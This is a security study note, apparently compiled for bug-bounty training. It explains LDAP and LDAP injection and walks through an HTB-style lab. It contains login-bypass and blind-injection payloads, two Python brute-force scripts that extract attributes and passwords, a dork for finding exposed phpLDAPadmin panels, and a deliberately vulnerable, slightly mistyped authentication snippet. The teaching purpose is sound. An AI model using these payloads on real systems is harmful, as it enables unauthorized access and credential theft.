# WHAT IS LDAP

The use of **LDAP** (Lightweight Directory Access Protocol) is mainly for locating various entities such as organizations, individuals, and resources like files and devices within networks, both public and private. It offers a streamlined approach compared to its predecessor, DAP, by having a smaller code footprint.

LDAP directories are structured to allow their distribution across several servers, with each server housing a **replicated** and **synchronized** version of the directory, referred to as a Directory System Agent (DSA). Responsibility for handling requests lies entirely with the LDAP server, which may communicate with other DSAs as needed to deliver a unified response to the requester.

The LDAP directory's organization resembles a **tree hierarchy, starting with the root directory at the top**. This branches down to countries, which further divide into organizations, and then to organizational units representing various divisions or departments, finally reaching the individual entities level, including both people and shared resources like files and printers.

**Default port:** 389 and 636(ldaps). Global Catalog (LDAP in ActiveDirectory) is available by default on ports 3268, and 3269 for LDAPS.

Copy

```
PORT    STATE SERVICE REASON
389/tcp open  ldap    syn-ack
636/tcp open  tcpwrapped
```

# WHAT IS LDAP INJECTION

**LDAP Injection** is an attack targeting web applications that construct LDAP statements from user input. It occurs when the application **fails to properly sanitize** input, allowing attackers to **manipulate LDAP statements** through a local proxy, potentially leading to unauthorized access or data manipulation.

```ad-important
Complementary PDF: [PDF](https://129538173-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2Fgit-blob-a58ea2462cf2b98a868750b068a00fa32ccb807b%2FEN-Blackhat-Europe-2008-LDAP-Injection-Blind-LDAP-Injection.pdf?alt=media)
```


```ad-important
**Filter** = ( filtercomp ) 
**Filtercomp** = and / or / not / item 
**And** = & filterlist **Or** = |filterlist 
**Not** = ! filter **Filterlist** = 1*filter 
**Item**= simple / present / substring 
**Simple** = attr filtertype assertionvalue 
**Filtertype** = _'=' / '~=' / '>=' / '<='_ 
**Present** = attr = * 
**Substring** = attr â€=â€ [initial] * [final] 
**Initial** = assertionvalue 
**Final** = assertionvalue 
**(&)** = Absolute TRUE 
**(|)** = Absolute FALSE
```

For example: `(&(!(objectClass=Impresoras))(uid=s*))` 
`(&(objectClass=user)(uid=*))`

You can access to the database, and this can content information of a lot of different types.

**OpenLDAP**: If 2 filters arrive, only executes the first one. **ADAM or Microsoft LDS**: With 2 filters they throw an error. **SunOne Directory Server 5.0**: Execute both filters.

**It is very important to send the filter with correct syntax or an error will be thrown. It is better to send only 1 filter.**

The filter has to start with: `&` or `|` 

Example: `(&(directory=val1)(folder=public))`

`(&(objectClass=VALUE1)(type=Epson*))` `VALUE1 = *)(ObjectClass=*))(&(objectClass=void`

Then: `(&(objectClass=``***)(ObjectClass=*))**` will be the first filter (the one executed).

# LOGIN BYPASS

LDAP supports several formats to store the password: clear, md5, smd5, sh1, sha, crypt. So, it could be that independently of what you insert inside the password, it is hashed.


```
user=*
password=*
--> (&(user=*)(password=*))
# The asterisks are great in LDAPi
```



```
user=*)(&
password=*)(&
--> (&(user=*)(&)(password=*)(&))
```


```
user=*)(|(&
pass=pwd)
--> (&(user=*)(|(&)(pass=pwd))
```



```
user=*)(|(password=*
password=test)
--> (&(user=*)(|(password=*)(password=test))
```


```
user=*))%00
pass=any
--> (&(user=*))%00 --> Nothing more is executed
```


```
user=admin)(&)
password=pwd
--> (&(user=admin)(&))(password=pwd) #Can through an error
```



```
username = admin)(!(&(|
pass = any))
--> (&(uid= admin)(!(& (|) (webpassword=any)))) â€”> As (|) is FALSE then the user is admin and the password check is True.
```



```
username=*
password=*)(&
--> (&(user=*)(password=*)(&))
```



```
username=admin))(|(|
password=any
--> (&(uid=admin)) (| (|) (webpassword=any))
```

## EXAMPLE OF A VULNERABLE CODE:

```python
from ldap3 import Server, Connection, ALL, NTLM

def authenticate(username, password):
    server = Server('ldap://example.com', get_info=ALL)
    conn = Connection(server, user=f'example_domain\\{username}, password=password, authentication=NTLM')
    if conn.bind():
        print('Authentication succesfull')
    else:
        print('Authentication failed')

if __name__ == '__main__':
    username_input = input('Username: ')
    password_input = input('Password: ')

    authenticate(username_input, password_input)
```

This code is vulnerable due to its `username_input` parameter, it is injected directed on the server, so, an attacker can use this to bypass the login or get access to confidential data.

The code is also vulnerable due to the lack of poor sanitization and validation of the user input, with a correct sanitization and validation, this vulnerability would not occur, for example, an attacker could be able to pass in the following payload to get admin access:

				`(&(username=admin)(|(password=*)))`

### VID LAB

I'll be using the same channel that I used in the [XPATH INJECTION](XPATH%20INJECTION.md) note:

<iframe width="800" height="545" src="https://www.youtube.com/embed/bqPtLEltBp4" title="Curso Bug Bounty  |  LDAP Injection- Capitulo 4-1" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
Imagine we have this lab:

![Pasted image 20241011170436.png](../../../../IMAGES/Pasted%20image%2020241011170436.png)
Login page with OpenLDAP server, if pass in a simple request, we get this:

![Pasted image 20241011170511.png](../../../../IMAGES/Pasted%20image%2020241011170511.png)

Seems like a simple POST request, we can follow the redirection to view this:

![Pasted image 20241011170548.png](../../../../IMAGES/Pasted%20image%2020241011170548.png)

So, we can log in, let's begin to test payloads to exploit the LDAP injection, for example, if we modify the values to `*`, we get this:
![Pasted image 20241011170642.png](../../../../IMAGES/Pasted%20image%2020241011170642.png)

Let's imagine the LDAP server injects the user input directly into the server, if so, an attacker could follow this guideline:

		`search_filter = f"(&(uid={username})(userPassword={password}))"`

So, if we follow our previous example, when we use `*` in both parameters, this would go into the server:

					`(&(uid=*)(userPassword=*))`

We would be performing that search filter, `*` performs as as "wildcard", which means, we are not searching for a specific user instead, we are looking up for every attribute in which `uid` exists, the same goes for `userPassword`, this is the simplest way to exploit a LDAP injection, let's send the request to burp to see its result:

![Pasted image 20241011171402.png](../../../../IMAGES/Pasted%20image%2020241011171402.png)

And we were able to log in even without credentials, this is the severity of the vulnerability, if the code is vulnerable, we can even authenticate using a simple injection.

Now imagine we want to login as an specific user, we can change the request like this:

![Pasted image 20241011171520.png](../../../../IMAGES/Pasted%20image%2020241011171520.png)

Change the username to the user we want to authenticate as, imagine we know the user for the admin of the server, we can log in using that, for the example, let's imagine user `coco` is the admin of the server, the search filter would go like this:

				`(&(uid=coco)(userPassword=*))`

Now, as explained previously, the wildcard would go and authenticate us even without coco's password.


But, could this only work if we know the whole user?

Not really, we could use the search filter even if we only know one letter, we could even brute force this to get access as the user we want:

				`(&(uid=h*)(userPassword=*))`

![Pasted image 20241011171901.png](../../../../IMAGES/Pasted%20image%2020241011171901.png)
![Pasted image 20241011171911.png](../../../../IMAGES/Pasted%20image%2020241011171911.png)
We were able to log in, even without knowing the user, seems like a critical vulnerability, doesn't it?

### SENDING IT TO INTRUDER:


If we send our request to intruder, we can brute force and see the length and response codes, let's see the example from the video:

![Pasted image 20241011172444.png](../../../../IMAGES/Pasted%20image%2020241011172444.png)
![Pasted image 20241011172456.png](../../../../IMAGES/Pasted%20image%2020241011172456.png)

For example, in that lab, we got this the moment we filtered the length:

![Pasted image 20241011172606.png](../../../../IMAGES/Pasted%20image%2020241011172606.png)
We already know the h contains an user, being it `htb-student`, but what about the s:



**![Pasted image 20241011172731.png](../../../../IMAGES/Pasted%20image%2020241011172731.png)

Seems like we've logged in as super user!


# BLIND LDAP INJECTION

You may force False or True responses to check if any data is returned and confirm a possible Blind LDAP Injection:


```ldap
This will result on True, so some information will be shown

Payload: *)(objectClass=*))(&objectClass=void
Final query: (&(objectClass= *)(objectClass=*))(&objectClass=void )(type=Pepi*))
```


```ldap
#This will result on True, so no information will be returned or shown

Payload: void)(objectClass=void))(&objectClass=void
Final query: (&(objectClass= void)(objectClass=void))(&objectClass=void )(type=Pepi*))
```




## Dump data

You can iterate over the ascii letters, digits and symbols:



```
(&(sn=administrator)(password=*))    : OK
(&(sn=administrator)(password=A*))   : KO
(&(sn=administrator)(password=B*))   : KO
...
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MA*))  : KO
(&(sn=administrator)(password=MB*))  : KO
...
```





## Scripts



### **Discover valid LDAP fields**

LDAP objects **contains by default several attributes** that could be used to **save information**. You can try to **brute-force all of them to extract that info.** You can find a list of [**default LDAP attributes here**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP_attributes.txt).


```python

import requests
import string
from time import sleep
import sys

proxy = { "http": "localhost:8080" }
url = "http://10.10.10.10/login.php"
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

attributes = ["c", "cn", "co", "commonName", "dc", "facsimileTelephoneNumber", "givenName", "gn", "homePhone", "id", "jpegPhoto", "l", "mail", "mobile", "name", "o", "objectClass", "ou", "owner", "pager", "password", "sn", "st", "surname", "uid", "username", "userPassword",]

for attribute in attributes: #Extract all attributes
    value = ""
    finish = False
    while not finish:
        for char in alphabet: #In each possition test each possible printable char
            query = f"*)({attribute}={value}{char}*"
            data = {'login':query, 'password':'bla'}
            r = requests.post(url, data=data, proxies=proxy)
            sys.stdout.write(f"\r{attribute}: {value}{char}")
            #sleep(0.5) #Avoid brute-force bans
            if "Cannot login" in r.text:
                value += str(char)
                break

            if char == alphabet[-1]: #If last of all the chars, then, no more chars in the value
                finish = True
                print()
```


### **Special Blind LDAP Injection (without "*")**

Copy

```python

import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(50):
    print("[i] Looking for number " + str(i))
    for char in alphabet:
        r = requests.get("http://ctf.web??action=dir&search=admin*)(password=" + flag + char)
        if ("TRUE CONDITION" in r.text):
            flag += char
            print("[+] Flag: " + flag)
            break
```

## Google Dorks



```
intitle:"phpLDAPadmin" inurl:cmd.php
```

## VIDEO

<iframe width="800" height="545" src="https://www.youtube.com/embed/z1l9BmnrxVE" title="Curso Bug Bounty  |  LDAP Data Exfiltration &amp; Blind Exploitation- Capitulo 4-2" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

### VID LAB

For this vid lab, we follow the same thing as the previous section, if we use the same payload as before, we get:

![Pasted image 20241011174044.png](../../../../IMAGES/Pasted%20image%2020241011174044.png)

So, seems like the server is vulnerable to BLIND LDAP injection, if we pass in the following payload, we get what we saw in the previous image, let's try to create another payload:

				`username=admin&password=*` -----> Base payload
			`username=admin)(|(description=*&password=invalid) -----> Data 
			exfiltration payload`

If we pass this to our proxy, we get the following:

![Pasted image 20241011174442.png](../../../../IMAGES/Pasted%20image%2020241011174442.png)
![Pasted image 20241011174518.png](../../../../IMAGES/Pasted%20image%2020241011174518.png)

We can even create our own tools for the enumeration and exploitation of this vulnerability.

